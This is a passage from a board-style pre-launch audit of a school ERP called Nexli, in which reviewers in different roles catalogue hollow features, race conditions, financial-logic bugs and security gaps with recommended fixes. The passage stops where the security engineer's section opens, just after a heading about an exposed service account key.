# NEXLI PRE-LAUNCH AUDIT — COMPLETE BOARD REVIEW

**Date:** 2026-06-18
**Auditors:** 15-role independent review board
**Scope:** Full source code, Firestore security rules, build configuration, business model, UX/accessibility
**Method:** Each reviewer read the actual source files independently, verified assumptions against running code, and produced a role-specific adversarial assessment

---

## EXECUTIVE SUMMARY

Nexli is a technically ambitious school ERP with 55+ genuine modules, a well-architected multi-tenant Firestore foundation, and real TypeScript discipline. The codebase is not a prototype — it reflects months of serious engineering work.

**It is not launch-ready.**

The board is unanimous: the product cannot be given to a paying school today without exposing children's safeguarding data to unauthorized access, corrupting financial records under concurrent load, and presenting fabricated AI data as a premium paid feature. The architecture is the best part of this product. The "last mile" — the gap between code existing and code being safe, complete, and honest — is where the project fails.

**Composite launch score: 3.7 / 10**

The highest score given by any reviewer was 6.2 (Co-Founder, who gave maximum credit for architecture). The lowest was 2 (Security Engineer and QA Lead, who evaluated against adversarial real-world use). The CFO could not assign a number because the product has no mechanism to charge money today.

The three-sentence verdict: The codebase architecture is production-quality, but several features are UI-complete with hollow backends (GPS shows zero vehicles because no driver writes positions; library fines display a column with no calculator; AI shows blurred previews of fabricated data). Multiple data-corruption race conditions exist in payroll, hostel allocation, RTE lottery, and admissions. The security posture — no App Check, missing Firestore rules for all messaging, a privilege-escalation path via self-written `grantedPermissions`, and a live service account key on the developer's machine — means a motivated adversary can access every POCSO case and medical record in the system today.

---

## INDIVIDUAL ROLE REPORTS

---

### ROLE 1 — FOUNDER

**Score: 3 / 10**
**Verdict:** We built a very impressive demo. We have not built a deployable product.

#### Findings

The vision is correct. Indian schools are genuinely underserved by existing ERP tools. The execution shows real understanding of school operations — the module breadth (55+ features across academic, finance, welfare, operations, compliance, and platform layers) reflects months of deliberate work. The multi-tenant architecture, data-driven RBAC, and atomic payment recording are genuinely well-built.

The gap between advertised and delivered is wide enough to destroy trust with the first real customer.

**What the demo shows vs. what ships:**

The AI features shown to investors and prospects are static hardcoded arrays behind a blur overlay. `PredictionsTab.tsx` contains `AT_RISK = [{name: 'Student A', score: 91}, ...]` — fake student names with fabricated risk scores. `SmartBriefingTab.tsx` contains a hardcoded `SUMMARY` string. `AssistantsTab.tsx` has all inputs set to `disabled tabIndex={-1} aria-hidden="true"`. None of these are roadmap items — they are claims being made right now that are false.

The Transport Live Map is real infrastructure (Leaflet, OpenStreetMap, live Firestore listener for `vehicle_positions`) pointing at a data source that nobody writes to. There is no driver-side app, no mobile PWA screen, and no script that pushes GPS coordinates. Every school that opens the Live Map will see zero vehicles on a correctly rendered map. The "0 Live vehicles" KPI card pulses in gold. There is nothing behind it.

**The demo tenant masks all of this.** The seeded `nexli-demo` school has 300 students, ₹85 lakh in fee data, published report cards, and 30 days of attendance. Everything looks alive. A real school entering real data on Day 1 will immediately encounter:

- Race conditions under concurrent use (hostel allocation overflow, duplicate TC numbers, RTE lottery corruption)
- Library overdue fines that show `—` for every book because no calculation logic exists
- Transport Live Map that permanently shows zero vehicles
- Canteen headcount that double-counts on any accidental duplicate entry

#### Recommended Fixes

1. Before any demo with a real school: audit every navigation destination against the question "if a principal opens this screen with no seeded data, what do they see?" Fix or remove anything that shows a broken state.
2. Remove the fine column from Library OverdueTab entirely, or implement a per-day configurable fine rate. Showing a column with `—` in every row is a product lie.
3. Either build a minimal driver PWA that writes GPS coordinates, or remove the "Live vehicles" KPI card and relabel the map as "Stop Map."
4. Label AI features honestly as "Coming Soon" or remove them from the product entirely until a real AI provider is integrated.
5. Fix the five most severe race conditions before onboarding any school with concurrent users.

#### Severity Summary

| Finding | Severity |
|---------|----------|
| AI features are fabricated data presented as live analysis | Critical |
| Transport Live Map has no data source | Critical |
| Library fine column never computes | High |
| Race conditions under concurrent use | Critical |
| Demo tenant masks all real-world failures | High |

---

### ROLE 2 — CO-FOUNDER

**Score: 6.2 / 10**
**Verdict:** The architecture is the best part. The problem is not code quality — it is that several features are UI-complete but functionally hollow.

#### Vision vs. Reality — Module-by-Module

**Transport — 75% vision delivered.**
Routes, stops, fleet management, document-expiry tracking, bus attendance (per-route, per-trip, per-student), SOS alerts with acknowledge/resolve workflow — all genuinely implemented. The LiveMap is real Leaflet/OSM with live position plotting. Critical gap: `vehicle_positions` are populated by `saveVehiclePosition()` but there is zero driver-facing app or mobile PWA screen to push GPS coordinates. The map is real infrastructure pointing at a data source that nobody writes to. In a demo with no GPS data flowing, the map shows empty.

**Hostel — 85% vision delivered.**
Rollcall (block-scoped, three sessions, unaccounted-alert, infirmary/leave statuses), Exeat with approval workflow and live overdue ticking, Mess tab, Allocations, Incidents — all real. No gaps that break the use case.

**Library — 80% vision delivered — but the known bug is real.**
Issue/return are atomically transacted (Firestore transaction, idempotent return, copy-count integrity). `isOverdue` and `daysOverdue` compute correctly. The `fine` field in `OverdueTab` reads `c.fine` — which is stored on the Firestore document — but nowhere in the codebase is `fine` ever computed and written. No Cloud Function sets it, and `returnBookTx` never calculates or writes a fine amount. The column displays `—` for every overdue record. This is not cosmetic — any school that wanted to collect fines using this system would collect zero.

**Canteen — 65% vision delivered.**
Menu planning with veg/non-veg/calorie tracking, FSSAI hygiene inspection log, and feedback tab are all real. The headcount dedup warning is surfaced but does not prevent double entry. Weekly KPI sums every row including duplicates. A canteen manager who records lunch twice will see inflated numbers with no correction path.

**Visitor — 70% vision delivered.**
Check-in form is complete with OTP generation, pass-number, printable pass, blacklist query on name/phone match, checkout workflow, history tab. The blacklist match is purely advisory — it fires a warning banner but does not block form submission. A gate guard can dismiss the warning and check in a blacklisted person in one click. For a school where the blacklist contains a court-ordered restraining-order violator, this is a liability.

**SPED (IEP) — 70% vision delivered.**
IEP form has student selection, disability/diagnosis, strengths/needs, accommodations, multi-goal system with area/status/strategy/target date. What is missing: no progress log per goal over time (status can be updated but there is no historical progression chart or review history), no parent/guardian signature capture, no transition plan section.

**Safeguarding — 80% vision delivered.**
POCSO form with severity, reporter role, student linkage, factual summary, confidential banner, case numbering, and CPO-only access gate. Real gap: no escalation workflow to external authorities (DCPU/CWC), no mandatory timeline tracking (POCSO requires a 24-hour reporting obligation), no file/evidence attachment.

**Medical — 75% vision delivered.**
Health records with blood group, height/weight/BMI, allergy/condition/medication chip lists, IHP textarea, emergency contacts, immunization tracking. No per-nurse scoping — any nurse/doctor reads all medical records across the school regardless of assigned area.

**Counseling — 50% vision delivered.**
Log a session (student + date + type + notes + follow-up flag), list sessions with type filter. Entirely missing: no edit capability (sessions are write-once), no session detail page, no counselor-specific filtering (all counselors see all sessions — breaks confidentiality in a multi-counselor school), no student-level history view.

**SMC — 75% vision delivered.**
Meetings tab with agenda, minutes, resolutions, attendance tracking. Budget tab with FY-scoped items and utilisation progress bars. Critical limitation: budget items are manually entered and the SMC budget is completely disconnected from the actual fees/expenses modules.

**UDISE — 85% vision delivered.**
Live aggregation from actual student/staff records, grade × gender matrix, social category breakdown, PTR calculation, CSV export with BOM. Genuinely good — reads real data. Limitation: only enrolment and staff counts; UDISE+ also requires infrastructure data (toilets, classrooms, computers) with no data source in Nexli.

**Consent (DPDP) — 65% vision delivered.**
Purpose catalogue and per-student consent records exist. Gap: no automated consent collection workflow, no consent expiry/renewal tracking, no guardian self-serve withdrawal. It is a register for staff to manually log consent, not an actual consent collection system.

#### Must-Fix Before First Customer

1. **Library fines never computed.** The fine column shows `—` for every overdue loan. Remove the column, or implement a per-school configurable rate and compute it on return.
2. **Canteen headcount has no upsert path.** Record headcount twice for the same meal/date → weekly totals double-count. Implement an upsert key `${date}_${mealType}`.
3. **GPS position writer does not exist.** Either build a minimal driver PWA, or remove the "Live vehicles" KPI card and relabel the map as "Stop Map."
4. **Visitor blacklist does not block check-in.** Add a require-supervisor-override pattern or at minimum disable the submit button on blacklist match.
5. **IT Admin backup log has a delete button.** This breaks audit trail integrity. Remove the delete action from backup log entries.
6. **Delegation is UI-only.** Firestore rules do not enforce delegations. Either remove delegation from the feature set for launch or ship rule enforcement simultaneously.
7. **Medical schoolId enforcement depends entirely on Firestore rules being deployed correctly.** Verify before onboarding the first school.

#### Should-Fix in First Month

1. Counseling: scope session list to `counselorUid` for non-leadership roles. Add edit capability.
2. POCSO: add mandatory reporting deadline field with overdue alert.
3. SPED: add `progressLog[]` to goal updates (append, not overwrite).
4. SMC budget: add note making the manual disconnect from actual financials explicit.
5. RTE lottery: no lottery selection mechanism exists — only stage field changes.
6. UDISE infrastructure data: add a settings-level infrastructure data form.

#### Scope Creep Features (Consider Removing or Deferring)

1. **IT Admin Integration Registry** — documentation UI with no live API calls. No operational value beyond a shared document.
2. **SPED Therapy Logs** before IEP progress history is complete.
3. **SMC module** for private schools — SMC is mandatory for government schools; private schools have different governance structures.

#### Embarrassing Demo Moments

1. Live Map with 0 vehicles. Three gold KPI cards show "0 Live vehicles." A prospect asks "where are the buses?" Honest answer: there's no driver app.
2. Library Overdue tab: every fine shows `—`. Principal asks "what's the fine amount?" There is no answer.
3. Headcount double-entry: operator accidentally records Lunch × 2. Warning shown, Save not blocked. "Meals served this week" shows double the real number.
4. Counseling: two counselors each read the other's confidential student notes.
5. Visitor blacklist warning with no enforcement. "We've added them to the blacklist — what happens when they arrive?" Gate guard can still issue a pass.
6. AI "Coming Soon" blur on every insight screen. A prospect who came for AI sees nothing but a blur.

#### Integration Gaps (Indian School Expectations)

| Integration | Status |
|-------------|--------|
| SMS/WhatsApp parent notifications | Not implemented |
| Online fee collection (Razorpay/UPI) | Not implemented |
| Tally/ERP export for finance | Not implemented |
| CBSE/Board result import | Not implemented |
| Biometric attendance terminal bridge | Not implemented |
| DigiLocker for TC/certificates | Not implemented |
| UDISE+ government portal API | Not implemented |

#### Import/Export Completeness

| Module | Import | Export |
|--------|--------|--------|
| Students | CSV import exists | Not confirmed |
| Staff | No bulk import | No export |
| Grades/Sections | No import | No export |
| Fees | No import | No export |
| Library catalog | No import | No export |
| UDISE | N/A | CSV export (working) |
| Health records | No import | No export |

#### Co-Founder Score Breakdown

| Dimension | Score |
|-----------|-------|
| Architecture and data integrity | 8/10 |
| Feature completeness (advertised vs. delivered) | 5/10 |
| Demo readiness | 4/10 |
| Integration readiness for Indian schools | 3/10 |
| Onboarding efficiency | 5/10 |
| Regulatory coverage (POCSO/DPDP/RTE) | 6/10 |
| **Overall** | **6.2/10** |

---

### ROLE 3 — CTO

**Score: 2 / 10 (effective)**
**Verdict:** The architecture decisions are sound. The implementation gaps are production-blocking.

#### Findings

**Spark tier incompatibility with offline-first design.**
`src/lib/firebase.ts` initializes Firestore with `persistentLocalCache` and `persistentMultipleTabManager`. The `persistentMultipleTabManager` is documented by Firebase as requiring a Blaze (paid) project — it uses IndexedDB locking mechanisms that are not available on the free Spark tier. This means the multi-tab offline sync that the app is designed around silently fails for every school on the current plan.

**No Firebase App Check.**
The Firebase API key is embedded in the compiled JavaScript bundle (visible in any browser's DevTools as a plaintext string in `dist/`). Without App Check, any actor who knows the API key and project ID — both visible in the browser — can make unauthenticated Firestore requests from any origin and probe security rules. The entire security model rests on a single layer (Firestore rules) with no attestation layer above it.

**`RoleRoutes` rebuilds on every render.**
`src/app/AppRouter.tsx` calls `RoleRoutes()` with no memoization. The function iterates ~70 registered modules, filters by audience, and builds a route tree on every render. Any context update (session state change, flag change, delegation change) triggers a full route rebuild. On a school with 118 role types and 70 modules, this is a significant unnecessary computation on every keystroke in a form that reads from session context.

**Session context is monolithic.**
`src/app/providers/SessionProvider.tsx` exposes a 12-field context object (status, firebaseUser, uid, isSuperAdmin, schoolId, role, secondaryRole, member, school, flags, delegatedModules, permissions). Any component subscribed to session re-renders on any field change. A fee payment updating `member.stats` re-renders the sidebar, the route guards, the permission checkers, and every KPI card simultaneously.

**`persistentMultipleTabManager` race condition.**
The `seqRef` guard in `SessionProvider` (a sequence counter used to discard stale profile loads) does not coordinate across tabs. Two tabs loading simultaneously can both increment the sequence, each discarding the other's profile load, resulting in a race to stable state that resolves non-deterministically.

**Source maps in production.**
`vite.config.ts:49` sets `sourcemap: true`. The full application source code is served alongside the production bundle. A school ERP handling Aadhaar fragments, medical conditions, POCSO case summaries, and payslip data should not expose its full source to anyone who opens DevTools.

**`permissionListGrants()` is O(n).**
`src/lib/rbac.ts` implements permission checking as a linear scan over the permission list on every `can()` call. For a user with 200+ permissions, every route guard, every `Guarded` wrapper, and every ownership check traverses the full list. This should be a pre-built Set lookup at O(1).

#### Recommended Fixes

1. Upgrade to Blaze tier with a billing budget cap — this is a prerequisite, not a choice.
2. Enable Firebase App Check with reCAPTCHA Enterprise.
3. Memoize `RoleRoutes` with `useMemo` keyed on `permissions + flags + delegatedModules`.
4. Split session context into at minimum: auth context (uid, isSuperAdmin, firebaseUser) + school context (schoolId, school, member, role) + permissions context (permissions, delegatedModules).
5. Change `sourcemap: true` to `sourcemap: false` in `vite.config.ts`.
6. Convert `permissionListGrants` to use a `Set` built at role-compile time.

#### Severity Summary

| Finding | Severity |
|---------|----------|
| Spark tier incompatible with persistentMultipleTabManager | Critical |
| No Firebase App Check | Critical |
| Source maps in production | High |
| RoleRoutes rebuilds on every render | Medium |
| Monolithic session context | Medium |
| O(n) permission checking | Medium |

---

### ROLE 4 — CPO (Chief Product Officer)

**Score: 4.5 / 10**
**Verdict:** Feature count is impressive. Feature depth in critical flows is shallow.

#### Findings

**The breadth problem.**
55+ modules for a first launch is an engineering achievement but a product liability. Every module that ships half-finished costs more in support, trust, and remediation than it gains in perceived completeness. Three modules (AI predictions, transport live map, library fines) will produce uncomfortable silences in the first real customer demo.

**No payment gateway.**
The fees module is a sophisticated manual ledger — invoice creation, payment recording, receipt generation, concession management, and fee structure templating are all built. But there is no digital payment collection. Schools expect Razorpay, Paytm, or UPI payment links. "We record your payments manually" is not a selling point for a product positioned as a digital transformation platform.

**No parent push notifications.**
The parent portal exists with a well-scoped family-facing interface (fee ledger, report cards, attendance, circulars). But there are no SMS, WhatsApp, or push notifications. Parents in Indian schools do not check web apps proactively. If a child is marked absent, the parent does not know until they look. This makes the parent portal a passive ledger rather than an active communication tool, which is 80% of its stated value.

**No self-serve trial flow.**
Every new school requires a Super Admin to manually provision the school (via the 7-step wizard), provision the first principal account (via the secondary Firebase app provisioning flow), and communicate a temporary password out-of-band. There is no invitation email, no self-registration, and no guided onboarding for the first admin user. At any meaningful scale, this onboarding cost kills growth.

**`v0.1.0` in the sidebar footer.**
`src/app/shell/Sidebar.tsx` renders `NEXLI School ERP v0.1.0` visible to every school user on every page. This signals pre-release software to risk-averse school administrators evaluating whether to trust Nexli with their data. Remove the version string or replace it with the school's name.

**Delegation as a product claim.**
The delegation feature is marketed as a genuine capability — a teacher can be granted temporary access to the HR module, a junior accountant can be delegated payroll review access. The UI is complete and well-designed. But the Firestore rules do not enforce delegation grants. A user who bypasses the UI (and without App Check, bypassing the UI is trivial) can write to any collection their role does not own, regardless of delegation state. This is a feature that produces a false sense of access control.

**PTM (Parent-Teacher Meeting) scheduling.**
PTM is one of the most critical and calendar-defining events in an Indian school year. It appears in the navigation structure. There is no implementation behind it.

#### Recommended Fixes

1. Remove or clearly label hollow features before any demo: AI tabs, Live Map, Library fine column.
2. Integrate Razorpay or a payment link generator for fee collection — even a basic "generate payment link" changes the school's perception of the product.
3. Add MSG91 or Fast2SMS for parent SMS notifications for absence and fee due.
4. Build a self-serve school trial flow with email-based admin provisioning.
5. Remove `v0.1.0` from the sidebar footer.
6. Either implement PTM scheduling or remove it from the navigation.

#### Severity Summary

| Finding | Severity |
|---------|----------|
| No payment gateway | High |
| No parent push notifications | High |
| No self-serve trial flow | High |
| Hollow AI/GPS/fine features | High |
| PTM navigation item with no implementation | Medium |
| v0.1.0 in sidebar footer | Medium |

---

### ROLE 5 — CFO (Chief Financial Officer)

**Verdict:** This product cannot charge money today.
**Score: Not assignable — no revenue mechanism exists.**

#### Findings

**No payment gateway.**
The plan tiers (`Starter ₹4,999/month`, `Growth ₹9,999/month`, `Professional ₹19,999/month`) are defined in `src/features/platform/meta.ts`. These are data structures. There is no Razorpay integration, no Stripe integration, no UPI collection, no invoice generation for the SaaS subscription itself, and no checkout flow. Every school using Nexli today uses it for free whether that is intended or not.

**No automated subscription enforcement.**
When a school's subscription lapses, the expected behavior is restricted access. The actual behavior: nothing changes. The `sweepExpiredSubscriptions()` function in `src/features/platform/data.ts` updates expired schools' subscription status, but it is called only inside `SchoolDetailPage` — a component that renders only when a Super Admin manually navigates to a school's detail page. A school whose subscription expired three months ago continues to have full access until a human remembers to check.

There is no Cloud Function, no scheduled job, and no automated enforcement. The subscription system is a display layer over a manual process.

**Revenue model has no collection mechanism.**
The per-student-count pricing model is sound for Indian schools. The problem is the infrastructure to execute it does not exist:
- No automated invoicing to schools
- No dunning management (no automated follow-up on overdue payments)
- No subscription upgrade/downgrade flow
- No annual vs. monthly billing toggle
- No trial-to-paid conversion flow
- No refund management

**What this means for unit economics.**
With no payment gateway and no automated subscription enforcement, the CAC (Customer Acquisition Cost) of each school includes the manual provisioning time (Developer + Super Admin), the manual subscription management time, and the manual renewal tracking time. At 10 schools, this is manageable. At 100 schools, this collapses.

**Financial reporting for the platform.**
The `platform/analytics` tab in the Super Admin dashboard shows school counts and plan distributions. It reads from the `schools` collection. The `studentCount` and `staffCount` fields on each school document are denormalized at creation time and never updated afterward — they will show zero for most schools after Day 1 because no process updates them as students are enrolled.

#### Recommended Fixes

1. Integrate Razorpay for subscription billing — even a basic "generate payment link" + manual activation unblocks revenue collection.
2. Move `sweepExpiredSubscriptions` to a Firebase Cloud Function triggered on a daily schedule (requires Blaze tier).
3. Add a student count update trigger (Cloud Function on `students` collection write) to keep platform analytics accurate.
4. Design a minimal dunning flow: email reminder at 7 days overdue, access restriction at 30 days overdue.
5. Build a self-serve upgrade flow so schools can change plans without Super Admin intervention.

#### Severity Summary

| Finding | Severity |
|---------|----------|
| No payment gateway | Critical |
| No automated subscription enforcement | Critical |
| Subscription sweep is manual/browser-triggered | High |
| studentCount/staffCount never updated | Medium |
| No dunning or renewal management | High |

---

### ROLE 6 — SENIOR SOFTWARE ARCHITECT

**Score: 4 / 10**
**Verdict:** The RBAC architecture is genuinely impressive. The implementation contains several critical races that corrupt shared state under normal concurrent use.

#### Findings

**What is well-architected.**

The 3-layer RBAC system (`compileRole()` + bundled catalog ← global Firestore override ← per-school Firestore override) is the most sophisticated permission system in any Indian school ERP I have reviewed. The key insight — that `roleId` is a string rather than an enum, making roles data-driven and extensible without code changes — is the right design decision. The `can()` function's three inference rules (exact match, broad satisfies scoped, write implies read) are correct and composable.

The module registry pattern (`registerModule()` + `React.lazy()` + `Guarded` + `RoleRoutes`) is a clean architecture for 55+ feature modules. Lazy loading is the right choice. The `Guarded` component correctly handles permission, any-permission, flag, and delegation gates in one declarative wrapper.

The multi-tenant isolation (`schools/{schoolId}/…` with `tenantCol(schoolId, sub)` and Firestore path enforcement) is solid. No cross-tenant data leakage exists in the data model.

The payment transaction (`recordPayment()` using `runTransaction`) is correctly atomic: receipt counter increment, payment write, and invoice status update happen atomically or not at all.

**`permissionListGrants()` is O(n), not O(1).**
`src/lib/rbac.ts` implements permission checking as a linear scan over the permission list on every `can()` call. A user with 200+ permissions triggers a full list traversal on every route guard, every `Guarded` wrapper, and every ownership check. The fix is to build a `Set<string>` at role-compile time and check membership in O(1). The linear scan is not noticeable at 10 permissions; it becomes measurable at 200+.

**`useCollection` deps instability.**
`src/lib/db.ts` accepts a caller-supplied `deps` array for the Firestore listener. If the caller passes an inline object or array literal as a dep, it creates a new reference on every render, causing the listener to tear down and re-subscribe on every render. This pattern appears in at least 12 call sites. The symptom is excessive Firestore read consumption and flickering data loading states.

**`RoleRoutes` rebuilds on every render.**
`src/app/AppRouter.tsx` calls the route-building logic on every render without memoization. For 118 roles × 70 modules, this is a non-trivial computation on every context update. Memoize with `useMemo` keyed on `permissions + flags + delegatedModules`.

**Session context is monolithic.**
The 12-field session context means any field change re-renders all subscribers. A fee payment that updates `member.stats` re-renders the sidebar, route guards, and every KPI card. Split into auth context (uid, isSuperAdmin) + school context (schoolId, school, member, role) + permissions context (permissions, delegatedModules).

**Non-atomic write patterns (multiple locations).**

The `recordPayment()` transaction is the only correctly atomic multi-document write in the codebase. The following critical flows use sequential awaits with no rollback:
- `provisionStaffMember()`: Firebase Auth user created before Firestore member/userIndex docs — network failure leaves an orphaned Auth account
- `AllocationsTab.save()`: capacity check read + counter update are not atomic — concurrent allocations overflow room capacity
- `admissions/AdmissionDetailPage.tsx`: `createStudent` + `updateAdmission` are two separate writes
- `payroll/RunsTab.tsx`: payslips written before the run doc — run doc write failure leaves orphaned payslips
- `expense/PurchaseOrderDetailPage.tsx`: `createGoodsReceipt` + `updatePurchaseOrder` are two separate writes

Each of these is a real-money or real-person flow where partial completion produces corrupt state.

#### Recommended Fixes

1. Convert `permissionListGrants` to use a `Set<string>` built at role-compile time.
2. Memoize `RoleRoutes` with `useMemo`.
3. Split session context into three separate contexts.
4. Fix all five non-atomic write patterns with `writeBatch` or `runTransaction`.
5. Audit all `useCollection` call sites for inline dep array literals.

#### Severity Summary

| Finding | Severity |
|---------|----------|
| Non-atomic hostel allocation | Critical |
| Non-atomic payroll run generation | Critical |
| Non-atomic admissions | High |
| Non-atomic GRN/PO update | High |
| useCollection deps instability | High |
| O(n) permission checking | Medium |
| RoleRoutes no memoization | Medium |
| Monolithic session context | Medium |

---

### ROLE 7 — PRINCIPAL ENGINEER

**Score: 4 / 10**
**Verdict:** The financial core is solid. The rest of the write paths are dangerous under concurrent load. 20 new bugs found beyond the known catalogue.

#### New Bugs Found

**BUG-1: Payment allowed on cancelled invoice via dropdown reset.**
`src/features/fees/CollectPaymentPage.tsx` lines 71–87. If a user selects a cancelled invoice then clears the dropdown to "General / advance payment," the `if (selected && amt > selectedDue)` guard is bypassed entirely. The `recordPayment()` transaction checks invoice status server-side, so the Firestore write is safe — but a receipt is still generated for a cancelled invoice. Receipt-to-invoice reconciliation is broken: a cancelled invoice shows ₹0 due but a receipt exists for it.

**BUG-2: Payroll run generation — orphaned payslips on partial failure.**
`src/features/payroll/RunsTab.tsx` lines 100–112. The `onGenerate` callback iterates `eligible` structures, calls `await savePayslip()` for each serially, then writes the run doc. If the network drops mid-loop: some payslips are written (no run doc exists yet), and the duplicate-check `existingIds.has(payrollRunId)` is keyed on the run doc. Since the run doc doesn't exist, the user can re-trigger generation, creating a second batch. The totals accumulated in the local variable restart from 0 on retry. Net effect: a pay run whose totals differ from the actual payslips.

**BUG-3: Hostel room allocation — capacity check and counter update are not atomic.**
`src/features/hostel/AllocationsTab.tsx` lines 81–116. `save()` reads `occByRoom.get(room.id)` (client-side count from snapshot) to check capacity, then calls `createAllocation()` and separately `updateHostelRoom()`. Two wardens allocating the last bed simultaneously both pass the capacity check and both succeed. The `occupied` counter ends at `used + 1` when it should be `used + 2`. The room shows one free slot that doesn't exist.

**BUG-4: RTE lottery uses `Math.random()` — non-cryptographic.**
`src/features/rte/ApplicationsTab.tsx` lines 108–110. The Fisher-Yates shuffle uses `Math.floor(Math.random() * (i + 1))`. `Math.random()` is not reproducible or auditable. The RTE Act 2009 Section 12(1)(c) lottery process requires verifiable randomness.

**BUG-5: TC number collides every 10 seconds.**
`src/features/students/tc/TCDetailPage.tsx` line 52. `String(Date.now()).slice(-4)` produces the last 4 decimal digits of the millisecond timestamp, cycling every 10 seconds. Two TCs issued within the same 10-second window produce identical numbers. TC numbers appear on legal transfer documents.

**BUG-6: Student import counter drifts from Firestore on partial failure.**
`src/features/students/import/StudentImportPage.tsx` lines 83–98. `nextAdmissionNo()` fetches the counter once, then the import loop increments a local `counter` variable. If a `createStudent` call fails partway, the counter advances past the failed row. On re-import, `nextAdmissionNo` re-reads the same counter from Firestore and reassigns the same admission numbers to new students.

**BUG-7: GRN/PO update is non-atomic.**
`src/features/expense/PurchaseOrderDetailPage.tsx` lines 219–233. `createGoodsReceipt()` and `updatePurchaseOrder()` are two separate `await`s. If `createGoodsReceipt` succeeds but `updatePurchaseOrder` fails, the GRN exists but the PO's `receivedQty` and `status` are not updated.

**BUG-8: `recomputeFromExisting` does not recalculate ESI/PT after LOP change.**
`src/features/payroll/RunDetailPage.tsx` lines 342–343. When LOP days change, only `lop` is updated in the spread. But ESI (based on gross minus LOP) and PT (also gross-based) are not recalculated. The function computes a wrong `totalDeductions` and wrong `netPay` for employees with ESI or PT deductions.

**BUG-9: `cancelInvoice` does not check for existing payments.**
`src/features/finance/data.ts` line 85. `cancelInvoice` sets `status: 'cancelled'` with a plain `updateDoc`. If a student has paid ₹5,000 against an invoice that is then cancelled, the summary shows billed=₹0, paid=₹0, outstanding=₹0. But the payment receipt still exists in `fee_payments` with the real paid amount. The ledger is inconsistent.

**BUG-10: Attendance `useEffect` deps use `roster.length` instead of `rosterKey`.**
`src/features/attendance/MarkAttendancePage.tsx` line 73. If one student is removed and another added to a section (same count), the `useEffect` does not re-seed `entries`. The outgoing student's attendance record stays in local state and is saved under the departing student's ID. The same bug exists in `transport/BusAttendanceTab.tsx` line 52 and `hostel/RollcallTab.tsx` line 60.

**BUG-11: `ResultsTab` Promise.all — partial save with no rollback.**
`src/features/examinations/ResultsTab.tsx` lines 139–169. `save()` calls `Promise.all(roster.map(async (s) => { await saveExamResult(...) }))`. If any save throws, `Promise.all` rejects and some results may already have been saved. On retry the user sees no indication of which students succeeded. In a classroom with 60+ students, this is an operational problem.

**BUG-12: GRN number collision on concurrent receipts.**
`src/features/expense/PurchaseOrderDetailPage.tsx` lines 219–222. `grnNo: docNumber('GRN', grnCount)` where `grnCount` is `receipts.length` from the real-time subscription. Two users recording a receipt simultaneously both read `receipts.length === N` and both generate `GRN-N+1`. Both writes succeed via `addDoc`. Two GRNs with identical numbers.

**BUG-13: `provisionStaffMember` — secondary app name collision under concurrency.**
`src/lib/provisioning.ts` line 80. `const secondaryName = \`nexli-provision-${Date.now()}\`` — two provisioning calls within 1ms throw `FirebaseError: Firebase App named '...' already exists`. Fix: use `crypto.randomUUID()`.

**BUG-14: TC clearance can regress from `approved` to `requested`.**
`src/features/students/tc/TCDetailPage.tsx` lines 37–42. `toggleClearance` sets `status: done ? 'clearance_pending' : 'requested'` without checking if the current status is `approved`. Un-toggling a clearance on an already-approved TC resets it to `requested`, bypassing the approval.

**BUG-15: `SosTab` defines `Card` component inside render.**
`src/features/transport/SosTab.tsx` line 76. A component defined inside another component's render function creates a new component type on every render, forcing React to unmount and remount every card on every parent re-render. Any internal state in the card is lost.

**BUG-16: `ResultsTab.computeRow` inflates `max` for unentered papers.**
`computeRow` adds each paper's `max` to the total `max` regardless of whether marks were entered. A student who sat 3 of 5 papers has a `max` of all 5 papers' marks but a `total` of only 3 papers' scores. Their percentage is deflated relative to papers attempted, making them appear to have failed when they may have passed.

**BUG-17: Concurrent concessions can exceed `grossAmount`.**
`ConcessionModal` reads `invoice.concessionAmount` from snapshot, computes `maxAllowed = grossAmount - concessionAmount`, and validates. Two users applying a concession simultaneously both see the same `concessionAmount` and both succeed. Total concessions can exceed `grossAmount`, making `netAmount` negative (clamped to 0). The resulting invoice shows `netAmount: 0` but has `concessionAmount > grossAmount`.

**BUG-18: Date parsing uses local time without timezone offset.**
Multiple files use `new Date(\`${date}T00:00:00\`)` without `Z` or a UTC offset. In IST (UTC+5:30), midnight local time = the previous UTC day. Fee payments, bus attendance, and GRN records created before 5:30 AM IST will appear on the previous calendar date in UTC-keyed reports.

#### Race Conditions Summary

| Location | Race | Effect |
|----------|------|--------|
| `hostel/AllocationsTab.tsx` | Capacity check vs. counter update | Room over-allocated |
| `rte/ApplicationsTab.tsx` | Concurrent lottery runs | All applications re-ranked, second run wins |
| `payroll/RunsTab.tsx` | Missing sentinel for run doc | Orphaned payslips, wrong totals |
| `students/tc/TCDetailPage.tsx` | Same-second TC issuance | Duplicate TC numbers on legal docs |
| `lib/provisioning.ts` | Same-ms concurrent provisioning | FirebaseError crashes provisioning |

#### Error Handling Gaps

1. `ResultsTab Promise.all` — partial saves swallowed; no per-student error report
2. `CollectPaymentPage` catch block — raw error discarded; user sees generic message, may retry causing duplicate payment attempt
3. `RunsTab.onGenerate` — per-payslip `await` has no inner try/catch; single failure aborts loop, leaves orphaned payslips
4. `StudentImportPage.runImport` — per-row errors logged but not surfaced to user; no remediation path
5. `TCDetailPage.toggleClearance` — no try/catch around `await updateTC()`; unhandled rejection produces console error with no user feedback

#### Performance Issues

| File | Issue | Impact |
|------|-------|--------|
| `MarkAttendancePage.tsx` | `useAllAttendance(schoolId)` loads entire school's attendance — 10,000+ docs on large schools | High |
| `HomeworkDetailPage.tsx` | `useHomework(schoolId)` loads all homework, `.find()` client-side | High |
| `SosTab.tsx` | All SOS alerts ever loaded; resolved ones sliced to 20 in UI only | Medium |
| `StudentImportPage` | Serial `await createStudent` — 500 students × RTT ≈ minutes | High |

#### Business Logic Errors

1. **LOP recalculate** (`RunDetailPage.tsx:342`): LOP changes gross but ESI/PT stay at old gross values.
2. **Results percentage** (`ResultsTab.tsx`): `max` includes all papers even if student didn't sit them.
3. **Concession race** (`ConcessionModal`): no transaction wrapping the concession read-check-write.
4. **Invoice zero-net** (`feeSchema.ts`): concession that reduces net to 0 marks invoice "paid" with no refund state for any overpayment.

---

### ROLE 8 — SECURITY ENGINEER

**Score: 2 / 10**
**Verdict:** This system cannot handle minors' safeguarding data at any production scale in its current state.

---

#### STOP-THE-PRESSES: Service Account Private Key Exposed

Before the structured findings, this is the most urgent issue in the entire audit:

